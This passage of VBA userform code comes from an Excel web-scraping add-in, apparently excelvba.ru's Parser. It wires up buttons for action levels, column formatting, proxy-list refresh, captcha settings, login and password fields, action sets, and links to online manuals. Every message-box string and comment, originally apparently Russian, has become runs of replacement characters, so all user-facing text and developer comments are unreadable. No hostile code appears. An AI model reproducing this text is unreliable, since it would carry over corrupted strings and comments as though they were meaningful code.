    Me.ActiveParser.Variables.Edit    'Me.Frame_Variables
End Sub

Private Sub CommandButton_InsertMacroIntoWorkbook_Click()
    On Error Resume Next
    If ActiveWorkbook Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical: Exit Sub
    
    With Me.ActiveMacro
        If Len(.code) Then AddMacroToWorkbook .code, ActiveWorkbook Else MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
    End With
End Sub

Sub CommandButton_MainActions_CreateSublevel_Click()
    On Error Resume Next
    With Me.ActiveParser.SourceData.Actions
        If .ActiveLevel >= 15 Then
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (15)", vbExclamation
            Exit Sub
        End If
        .GetActiveActions.GetSubActions.Activate
        
        Dim i&
        Me.StopEvents = True
        Me.ComboBox_MainActions_Level.Clear
        For i = 1 To .GetMaxLevel
            Me.ComboBox_MainActions_Level.AddItem i
        Next
        Me.ComboBox_MainActions_Level.value = .ActiveLevel
        Me.ListBox_Actions_Main.list = .GetActiveActions.ToArray(, True)
        Me.StopEvents = False
        Update_LevelButtons
        Me.CommandButton_EditActions_Main.SetFocus
    End With
End Sub

Sub Update_LevelButtons()
    On Error Resume Next: Dim cv&, mv&, Caption$, aaic&
    With Me.ActiveParser.SourceData.Actions
        cv& = .ActiveLevel: mv& = .GetMaxLevel
        aaic& = .GetActiveActions.Items.Count
    End With
    
    Me.Frame_MainAction_Levels.Visible = Not (aaic& = 0 And cv& = 1 And mv& = 1)
    Me.CommandButton_MainActions_CreateSublevel.Visible = (aaic& > 0) Or (cv& < mv&)
    Me.CommandButton_MainActions_DeleteLevel.Visible = False
    Me.Label_MainActions_InsertSublevel.Visible = False
    
    Select Case True
        Case cv = mv
            Caption$ = "  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & cv + 1
            Set Me.CommandButton_MainActions_CreateSublevel.Picture = Me.ImageAdd.Picture
            
        Case cv < mv
            Caption$ = "  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & cv + 1
            Set Me.CommandButton_MainActions_CreateSublevel.Picture = Me.ImageNext.Picture
            
    End Select
    Me.CommandButton_MainActions_DeleteLevel.Visible = cv >= 1
    Me.CommandButton_MainActions_CreateSublevel.Caption = Caption$
End Sub

Private Sub CommandButton_MainActions_DeleteLevel_Click()
    On Error Resume Next
    Dim parentAAs As ArrayActions, childAAs As ArrayActions, i&, maxLevel&, AL&, aaic&, msg$
    
    With Me.ActiveParser.SourceData.Actions
        aaic& = .GetActiveActions.Items.Count
        AL& = .ActiveLevel    ': If AL& = 1 Then Exit Sub
        
        If aaic& Then
            msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & aaic& & " |fffd||fffd|.) " & vbNewLine & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & AL& & "?"
            If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Sub
        End If
        
        maxLevel& = .GetMaxLevel - 1
        If maxLevel& > 0 Then
            If AL& = .GetMaxLevel Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set .GetActionsByLevel(AL& - 1).SubActions = Nothing
                .ActiveLevel = .ActiveLevel - 1
                
            ElseIf AL& = 1 Then       ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Dim node As IXMLDOMElement
                Set node = .GetActionsByLevel(2).ExportToXML
                Set Me.ActiveParser.SourceData.Actions = New ArrayActions
                With Me.ActiveParser.SourceData.Actions
                    Set .ParentParser = Me.ActiveParser
                    .LoadFromXML node
                    .ActiveLevel = 1
                End With
                Set node = Nothing
                
            Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                With .GetActiveActions
                    Set parentAAs = .GetActionsByLevel(AL& - 1)
                    Set childAAs = .GetActionsByLevel(AL& + 1)
                    
                    Set parentAAs.SubActions = childAAs
                    Set childAAs.ParentActions = parentAAs
                End With
            End If
            
        Else    ' maxLevel& = 0 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            While .Items.Count > 0
                .Items.Remove 1
            Wend
            maxLevel& = 1
        End If
    End With
    
    With Me.ActiveParser.SourceData.Actions
        Me.StopEvents = True
        Me.ComboBox_MainActions_Level.Clear
        For i = 1 To maxLevel&
            Me.ComboBox_MainActions_Level.AddItem i
        Next
        Me.ComboBox_MainActions_Level.value = .ActiveLevel
        Me.ListBox_Actions_Main.list = .GetActiveActions.ToArray(, True)
        Me.StopEvents = False
        Update_LevelButtons
    End With
End Sub

Private Sub CommandButton_OCF_GetFromSelectedRow_Click()        ' for selected column
    On Error Resume Next
    Me.ActiveColumn.Format.LoadFormatFromRow Selection.Cells(1).EntireRow
    Me.Load_ActiveColumn_Values
End Sub
Private Sub CommandButton_OCsF_GetFromSelectedRow_Click()        ' for all columns
    On Error Resume Next
    Dim cell As Range, OC As OutputColumn
    Set cell = Selection.Cells(1).EntireRow
    
    For Each OC In Me.ActiveColumn.Parent.Items
        OC.Format.LoadFormatFromRow cell
    Next
    Me.Load_ActiveColumn_Values
End Sub

Private Sub CommandButton_OpenCacheFolder_Click()
    On Error Resume Next
    FWF.OpenFolder Me.ActiveParser.GetCacheFolderPath
End Sub

Private Sub CommandButton_Proxy_UpdateProxyList_Click()
    On Error Resume Next
    If Me.ActiveParser.Proxy.GetMoreProxies Then Fill_Proxy_Values
End Sub

Private Sub CommandButton_RunParserStart_Click()
    On Error Resume Next
    TEST_ACTIONS_MODE = True
    Me.CommandButton_RunParserStart.Enabled = False
    StopMacro = False
    Me.ActiveParser.RunParserStart
    StopMacro = True
    Me.CommandButton_RunParserStart.Enabled = True
    TEST_ACTIONS_MODE = False
    Me.FillActiveParserValues
End Sub

Private Sub CommandButton_SaveExtraActionSet_Click()
    On Error Resume Next
    Dim res As Boolean, ASetSource$
    ASetSource$ = Me.ListBox_ActionSets.list(Me.ListBox_ActionSets.ListIndex, 2) ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    res = Me.ActiveParser.Resources.GetItemByName(ASetSource$).UpdateObjectByID(Me.ActiveActionSetID, Me.ActiveActionSet)
    Me.CommandButton_SaveExtraActionSet.Visible = Not res
End Sub

Private Sub CommandButton_SaveParser_Click()
    On Error Resume Next
    Me.ActiveParser.Save
    Update_WP_Info
End Sub

Private Sub CommandButton_Var_Info_Click()
    On Error Resume Next
    MsgBox Me.Frame_Variables.Controls.Count
End Sub

Private Sub CommandButton_SelectAutoColumn_Click()
    test_popup
End Sub

Private Sub Image_FindColumn_Click()
    On Error Resume Next
    Dim res, msg$
    If ActiveSheet Is Nothing Then
        MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel", vbCritical
        Exit Sub
    End If
    StopMacro = False
    res = Me.ActiveParser.SourceData.FindColumn(ActiveSheet, True, msg$)
    If res Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(res), vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Else
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub

Private Sub Image_FindRange_Click()
    On Error Resume Next
    If ActiveSheet Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub
    StopMacro = False
    
    With Me.ActiveParser
        .ReadOptionsFromINI
        .Variables.Initialize
        ParserVariables.item("{ParserName}") = .Name
    End With
    
    With Me.ActiveParser.SourceData
        Set .SourceSheet = ActiveSheet
        If .InitializeAllItems Then
            Dim ra As Range, SI As ParserSourceItem
            For Each SI In .Items
                If ra Is Nothing Then Set ra = SI.SheetRangeMode_Cell Else Set ra = Union(ra, SI.SheetRangeMode_Cell)
            Next
            ra.Select
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ra.Cells.Count, vbInformation
        Else
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        End If
    End With
End Sub

Private Sub Label_AddLoginAndPassword_Click()
    On Error Resume Next
    With Me.ActiveParser.Variables
        If .GetItemByName("login") Is Nothing Then
            With .Create(False)
                .Name = "login": .ControlType = "TextBox": .LabelText = "|fffd||fffd||fffd||fffd||fffd|:"
            End With
        End If
        If .GetItemByName("password") Is Nothing Then
            With .Create(False)
                .Name = "password": .ControlType = "TextBox password": .LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd|:"
            End With
        End If
    End With
    Me.RefreshVariablesList
End Sub

Private Sub Label_CreateNewVariable_Click()
    On Error Resume Next
    Me.ActiveParser.Variables.Create True
    Me.RefreshVariablesList
End Sub

Private Sub Label_EditVariables_Click()
    On Error Resume Next
    Me.ActiveParser.Variables.Edit "UpdateParserSettingsVariables"
End Sub

Private Sub Label_Goto_ColumnAutoOrder_Click()
    On Error Resume Next
    Me.MultiPage_OutputColumnsCommands.Pages("Page_AutoOrder").Visible = True
    Me.MultiPage_OutputColumnsCommands.value = Me.MultiPage_OutputColumnsCommands.Pages("Page_AutoOrder").Index
End Sub

Private Sub Label_Goto_Page_Captcha_Click()
    On Error Resume Next
    With F_Settings
        .Show
        .MultiPageSettings.value = .MultiPageSettings.Pages("Page_Captcha").Index
    End With
End Sub

Private Sub Label_Help_Proxy_Check_Presets_Click()
    Dim msg$: msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| URL |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|/|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
        "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
        "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
End Sub

Private Sub Label_HiddenWP_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next
    If Button * Shift = Shift + Button + 5 Then
        Me.MultiPage_WP.Pages("Page_Protection").Visible = Button > Shift
        If Button > Shift Then Me.MultiPage_WP.value = Me.MultiPage_WP.Pages("Page_Protection").Index
    End If
End Sub

Private Sub Label_MainActions_InsertSublevel_Click()
    On Error Resume Next
    Dim ind&, i&
    ind& = Val(Me.ListBox_Actions_Main.list(Me.ListBox_Actions_Main.ListIndex, 0))
    If ind& = 0 Then Exit Sub
    
    With Me.ActiveParser.SourceData.Actions
        .GetActiveActions.InsertSublevel ind&
        
        Me.StopEvents = True
        Me.ComboBox_MainActions_Level.Clear
        For i = 1 To .GetMaxLevel
            Me.ComboBox_MainActions_Level.AddItem i
        Next
        Me.ComboBox_MainActions_Level.value = .ActiveLevel
        Me.ListBox_Actions_Main.list = .GetActiveActions.ToArray(, True)
        Me.StopEvents = False
        Update_LevelButtons
        Me.CommandButton_EditActions_Main.SetFocus
        
        Me.Label_MainActions_InsertSublevel.Visible = False
    End With
End Sub

Private Sub Label_OC_QS_Apostrophize_Click()
    On Error Resume Next
    With Me.ActiveColumn.Actions.AddNewAction("AddPrefixAndSuffix")
        .parameters.item("Prefix").value = "'"
    End With
    Me.UpdateArrayActions
End Sub

Private Sub Label_OC_QS_Blank_Click()
    On Error Resume Next
    With Me.ActiveColumn.Actions.AddNewAction("SetValue")
        
    End With
    Me.UpdateArrayActions
End Sub

Private Sub Label_OC_QS_TagFromClipboard_HTML_Click()
    On Error Resume Next
    Dim arr: arr = GetTagInfoFromClipboard
    If Not IsArray(arr) Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|)", vbExclamation: Exit Sub
    With Me.ActiveColumn.Actions.AddNewAction("GetTags")
        .parameters.item("TagName").value = arr(0)
        .parameters.item("AttrName").value = arr(1)
        .parameters.item("AttrValue").value = arr(2)
        .parameters.item("Result").value = "innerHTML 1"
    End With
    Me.UpdateArrayActions
End Sub

Private Sub Label_OC_QS_TagFromClipboard_Text_Click()
    On Error Resume Next
    Dim arr: arr = GetTagInfoFromClipboard
    If Not IsArray(arr) Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|)", vbExclamation: Exit Sub
    With Me.ActiveColumn.Actions.AddNewAction("GetTags")
        .parameters.item("TagName").value = arr(0)
        .parameters.item("AttrName").value = arr(1)
        .parameters.item("AttrValue").value = arr(2)
        .parameters.item("Result").value = "ConvertToText 1"
    End With
    Me.UpdateArrayActions
End Sub


Private Sub Label_Protection_Deselect_Click()
    On Error Resume Next
    Me.CheckBox_Protection_SD_Source = False
    Me.CheckBox_Protection_SD_Actions = False
    Me.CheckBox_Protection_Output_Common = False
    Me.CheckBox_Protection_Output_Actions = False
    Me.CheckBox_Protection_Download_Common = False
    Me.CheckBox_Protection_Extra_Common = False
    Me.CheckBox_Protection_Extra_Actions = False
    Me.CheckBox_Protection_ActualVersion = False
    Me.CheckBox_Protection_ArrayLimit = False
    Me.CheckBox_Protection_Replace = False
End Sub

Private Sub Label_Protection_SetDefaultPublishSettings_Click()
    On Error Resume Next
    Dim Hide_SD_Source As Boolean
    Hide_SD_Source = (Me.ActiveParser.SourceData.Mode = ps_FixedValue) And (Me.ActiveParser.SourceData.FixedValueMode_Value = "")
    
    Me.CheckBox_Protection_SD_Source = Not Hide_SD_Source
    Me.CheckBox_Protection_SD_Actions = False
    Me.CheckBox_Protection_Output_Common = True
    Me.CheckBox_Protection_Output_Actions = False
    Me.CheckBox_Protection_Download_Common = True
    Me.CheckBox_Protection_Extra_Common = True
    Me.CheckBox_Protection_Extra_Actions = False
    Me.CheckBox_Protection_ActualVersion = True
    Me.CheckBox_Protection_ArrayLimit = True
    Me.CheckBox_Protection_Replace = False
End Sub

Private Sub Label_SetCurrentSheetZoom_Click()
    On Error Resume Next
    Me.ComboBox_SheetZoom = Round(ActiveWindow.Zoom, 0) & " %"
End Sub

Private Sub Label190_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/proxy"
End Sub
Private Sub Label192_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals"
End Sub
Private Sub Label193_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/SourceDataTab"
End Sub
Private Sub Label194_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/MainInfoTab"
End Sub
Private Sub Label195_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/OutputTab/ColumnList"
End Sub
Private Sub Label197_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/OutputTab/Extra"
End Sub
Private Sub Label198_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/OutputTab/SheetOptions"
End Sub
Private Sub Label200_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/source"
End Sub
Private Sub Label201_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/DownloadTab"
End Sub
Private Sub Label202_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/options"
End Sub
Private Sub Label203_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/ActionSets"
End Sub
Private Sub Label204_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/macro"
End Sub
Private Sub Label205_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/errors"
End Sub
Private Sub Label206_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/captcha"
End Sub
Private Sub Label207_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/proxy"
End Sub
Private Sub Label208_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/file"
End Sub
Private Sub Label209_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/ExtraTab/other"
End Sub
Private Sub Label210_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/proxy"
End Sub
Private Sub Label211_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/proxy/setup"
End Sub
Private Sub Label212_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/editor/OutputTab/ColumnSetup"
End Sub
Private Sub Label214_Click()
    ShowActionManuals
End Sub
Private Sub Label215_Click()
    ShowActionManuals
End Sub
Private Sub Label216_Click()
    ShowActionManuals
End Sub
Private Sub Label217_Click()
    ShowActionManuals
End Sub
Private Sub Label218_Click()
    ShowActionManuals
End Sub
Private Sub Label219_Click()
    ShowActionManuals
End Sub

Private Sub Label220_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/ActionSets/events"
End Sub

Private Sub ListBox_Actions_Main_Click()
    On Error Resume Next
    Dim ind&
    ind& = Val(Me.ListBox_Actions_Main.list(Me.ListBox_Actions_Main.ListIndex, 0))
    If ind Then
        Me.Label_MainActions_InsertSublevel.ControlTipText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ind
        Me.Label_MainActions_InsertSublevel.Visible = True
    Else
        Me.Label_MainActions_InsertSublevel.Visible = False
    End If
End Sub

Private Sub ListBox_Actions_Main_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next: Dim txt$, lvl&
    txt$ = Me.ListBox_Actions_Main.list(Me.ListBox_Actions_Main.ListIndex, 1)
    If txt Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd| #*" Then
        lvl& = Val(Split(txt, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| ")(1))
        If lvl& > 0 Then Me.ComboBox_MainActions_Level.value = lvl&
    Else
        CommandButton_EditActions_Main_Click
        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        lvl& = Val(Me.ListBox_Actions_Main.list(Me.ListBox_Actions_Main.ListIndex, 0))
        If lvl& > 0 Then FP_ArrayActions_Edit.ListBox_ArrayActions.ListIndex = lvl& - 1
    End If
End Sub

Private Sub ListBox_ActionSets_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    Set Me.ActiveActionSet = Nothing
    
    With Me.ListBox_ActionSets
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim ASetSource$, ID$
        ASetSource$ = .list(.ListIndex, 2)
        ID$ = "": ID$ = Split(.list(.ListIndex, 0), "ID=")(1)
        Me.ActiveActionSetID = ID$
        
        Select Case ASetSource$
            Case "" ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set Me.ActiveActionSet = Me.ActiveParser.AASets.GetItemByIndex(Me.ListBox_ActionSets.ListIndex + 1)
                
                Me.Frame_SelectedActionSet.Caption = Me.Frame_SelectedActionSet.Tag
                Me.Frame_SelectedActionSet.ForeColor = vbButtonText
                
            Case Else ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' Debug.Print "ASetSource$ = " & ASetSource$, "ID$ = " & ID$
                
                'Set Me.ActiveActionSet = Me.ActiveParser.AASets.ResourceItems.item(ID$)
                Set Me.ActiveActionSet = Me.ActiveParser.AASets.GetExtraItemByObjectID(ID$)
                
                Me.ActiveActionSet.Index = .ListIndex + 1
                
                Me.Frame_SelectedActionSet.Caption = Me.Frame_SelectedActionSet.Tag & " ID=" & ID & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ASetSource$
                Me.Frame_SelectedActionSet.ForeColor = vbRed
                
        End Select
        
        Me.Frame_SelectedActionSet.Visible = .ListIndex >= 0
        Me.Load_ActiveActionSet_Values
        
        Me.CommandButton_DeleteActionSet.Enabled = (.ListIndex >= 0) ' And (ID$ = "")
        Me.CommandButton_CloneActionSet.Enabled = (.ListIndex >= 0) And (ID$ = "")
        Me.CommandButton_ActionSet_Execute.Enabled = .ListIndex >= 0
    End With
End Sub

Private Sub CommandButton_AddActionSet_Click()
    On Error Resume Next
    Dim ind&
    ind& = Me.ActiveParser.AASets.Add.Index
    Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = ind& - 1
    Me.ListBox_ActionSets.SetFocus
End Sub

Private Sub CommandButton_CloneActionSet_Click()
    On Error Resume Next
    Dim ind&
    With Me.ActiveActionSet.ParentSets
        With .Add
            ind& = .Index
            .LoadFromXML ActiveActionSet.ExportToXML
        End With
        .UpdateIndexes
    End With
    Me.Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = ind& - 1
End Sub

Private Sub CommandButton_DeleteActionSet_Click()
    On Error Resume Next
    Dim ind&, res As Boolean: ind& = Me.ActiveActionSet.Index
    Dim ASetSource$, ID$
    ASetSource$ = Me.ListBox_ActionSets.list(Me.ListBox_ActionSets.ListIndex, 2)
    
    If Me.ActiveActionSetID = "" Then
        Me.ActiveParser.AASets.DeleteItem Me.ActiveActionSet.Index
        
    Else ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        res = Me.ActiveParser.Resources.GetItemByName(ASetSource$).DeleteObject(Me.ActiveActionSetID)
        If Not res Then Exit Sub ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        'Set Me.ActiveParser.AASets.ResourceItems = New Dictionary ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Me.ActiveParser.Resources.Initialize
    End If
    
    Set Me.ActiveActionSet = Nothing
    Me.Fill_ActionSets_Values
    Me.ListBox_ActionSets.ListIndex = IIf(ind& - 2 < 0, 0, ind& - 2)
    Me.ListBox_ActionSets.SetFocus
    
    
